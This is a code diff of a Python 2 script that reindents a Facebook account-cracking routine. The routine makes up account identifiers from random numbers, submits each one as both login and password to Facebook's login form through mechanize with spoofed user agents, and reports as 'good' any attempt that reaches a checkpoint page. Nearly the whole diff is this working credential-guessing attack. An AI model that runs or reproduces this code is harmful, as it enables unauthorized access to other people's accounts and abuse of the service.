@@ -1377,37 +1377,37 @@ def available_facebook_motah():
         print "[*]"+default+"starting cracking"
         print ""
 	def menu():
-		try:
-			email = str(raw_input("email"))
-			email = str(random.randint(11111111,99999999))
-			go = kk + email
-                        password = str(raw_input("bass" ))
-                        password = str(random.randint(11111111,99999999))
-                        login = 'https://www.facebook.com/login.php?login_attempt=1'
-                        useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-                        basss = random.randint(1111111,9999999)
-                        br = mechanize.Browser()
-                        amer = cookielib.LWPCookieJar()
-                        br.set_handle_robots(False)
-                        br.set_handle_redirect(True)
-                        br.set_cookiejar(amer)
-                        br.set_handle_equiv(True)
-                        br.set_handle_referer(True)
-                        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5) 
-                        br.addheaders = [('User-agent', random.choice(useragents))]
-                        site = br.open(login)
-                        br.select_form(nr = 0)
-                        br.form['email'] = go
-                        br.form['pass'] = go
-                        sub = br.submit()
-                        log = sub.geturl()
-                        print b,"[*]Check===> ",r,go
-                        if "https://www.facebook.com/checkpoint/?next" in log :
-				print g,"[*]good ---------> ",c,go
-                        elif "https://www.facebook.com/login.php" and "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
-                                print ""
-                        elif "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
-                                print ""
+	try:
+		email = str(raw_input("email"))
+		email = str(random.randint(11111111,99999999))
+		go = kk + email
+                password = str(raw_input("bass" ))
+                password = str(random.randint(11111111,99999999))
+                login = 'https://www.facebook.com/login.php?login_attempt=1'
+                useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+                basss = random.randint(1111111,9999999)
+                br = mechanize.Browser()
+                amer = cookielib.LWPCookieJar()
+                br.set_handle_robots(False)
+                br.set_handle_redirect(True)
+                br.set_cookiejar(amer)
+                br.set_handle_equiv(True)
+                br.set_handle_referer(True)
+                br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5) 
+                br.addheaders = [('User-agent', random.choice(useragents))]
+                site = br.open(login)
+                br.select_form(nr = 0)
+                br.form['email'] = go
+                br.form['pass'] = go
+                sub = br.submit()
+                log = sub.geturl()
+                print b,"[*]Check===> ",r,go
+                if "https://www.facebook.com/checkpoint/?next" in log :
+			print g,"[*]good ---------> ",c,go
+                elif "https://www.facebook.com/login.php" and "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
+                        print ""
+                elif "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
+                        print ""
 		else :
 			print y,"--------------------------------"
                         print g,"[*]email ---------> ",g,go
@@ -1415,8 +1415,7 @@ def available_facebook_motah():
                         print y,"--------------------------------"
                         pilih()
 		        raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
-			menu()
-        
+			menu()        
 def hack():
 	global toket
 	os.system('clear')
